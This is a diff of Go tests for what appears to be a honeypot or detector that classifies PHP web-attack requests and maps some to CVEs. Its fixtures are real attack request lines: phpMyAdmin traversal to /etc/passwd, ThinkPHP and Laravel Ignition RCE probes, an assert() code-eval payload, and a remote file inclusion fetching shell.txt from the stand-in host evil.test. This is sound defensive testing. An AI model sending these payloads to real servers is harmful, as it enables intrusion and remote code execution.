@@ -48,3 +48,47 @@ func TestPHPCGICVEMapping(t *testing.T) {
 		t.Errorf("CVE-2017-9841 not flagged; cves=%v", cves)
 	}
 }
+
+func TestPHPVulnEmulationMore(t *testing.T) {
+	cases := []struct {
+		name, line string
+		body       []byte
+		want       string
+	}{
+		{"phpmyadmin-lfi", "GET /phpmyadmin/index.php?target=db_sql.php%253f/../../../../etc/passwd HTTP/1.1", nil, "webapp:phpmyadmin-lfi"},
+		{"phpmyadmin-setup", "GET /phpmyadmin/scripts/setup.php HTTP/1.1", nil, "webapp:phpmyadmin-setup-rce"},
+		{"adminer", "GET /adminer.php HTTP/1.1", nil, "webapp:adminer-exposed"},
+		{"laravel-ignition", "POST /_ignition/execute-solution HTTP/1.1", []byte("{}"), "webapp:laravel-ignition-rce"},
+		{"thinkphp", "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo HTTP/1.1", nil, "webapp:thinkphp-rce"},
+		{"phpfpm-status", "GET /status HTTP/1.1", nil, "webapp:phpfpm-status"},
+		{"composer", "GET /composer.lock HTTP/1.1", nil, "webapp:composer-manifest-leak"},
+		{"php-cgi-exposed", "GET /cgi-bin/php-cgi HTTP/1.1", nil, "webapp:php-cgi-exposed"},
+		{"webshell", "GET /wso.php HTTP/1.1", nil, "webapp:webshell-probe"},
+		{"wp-user-enum", "GET /wp-json/wp/v2/users HTTP/1.1", nil, "webapp:wordpress-user-enum"},
+		{"xmlrpc-brute", "POST /xmlrpc.php HTTP/1.1", []byte("<methodCall><methodName>system.multicall</methodName></methodCall>"), "webapp:wordpress-xmlrpc-brute"},
+		{"superglobal", "GET /index.php?GLOBALS[x]=1 HTTP/1.1", nil, "webapp:php-superglobal-pollution"},
+		{"type-juggle", "POST /login.php HTTP/1.1", []byte("password[]=x"), "webapp:php-type-juggling"},
+		{"php-rfi", "GET /index.php?page=http://evil.test/shell.txt HTTP/1.1", nil, "webapp:php-rfi"},
+		{"code-eval", "GET /x.php?f=assert(phpinfo()) HTTP/1.1", nil, "webapp:php-code-eval"},
+	}
+	for _, c := range cases {
+		anoms, _ := phpAnoms(c.line, c.body)
+		if !containsStr(anoms, c.want) {
+			t.Errorf("%s: expected %q; anomalies=%v", c.name, c.want, anoms)
+		}
+	}
+}
+
+func TestPHPMoreCVEMapping(t *testing.T) {
+	for _, c := range []struct{ line, body, cve string }{
+		{"GET /phpmyadmin/index.php?target=x%253f/../etc/passwd HTTP/1.1", "", "CVE-2018-12613"},
+		{"GET /phpmyadmin/scripts/setup.php HTTP/1.1", "", "CVE-2009-1151"},
+		{"GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array HTTP/1.1", "", "CVE-2018-20062"},
+		{"POST /_ignition/execute-solution HTTP/1.1", "{}", "CVE-2021-3129"},
+	} {
+		_, cves := phpAnoms(c.line, []byte(c.body))
+		if !containsStr(cves, c.cve) {
+			t.Errorf("%s: expected %s; cves=%v", c.line, c.cve, cves)
+		}
+	}
+}
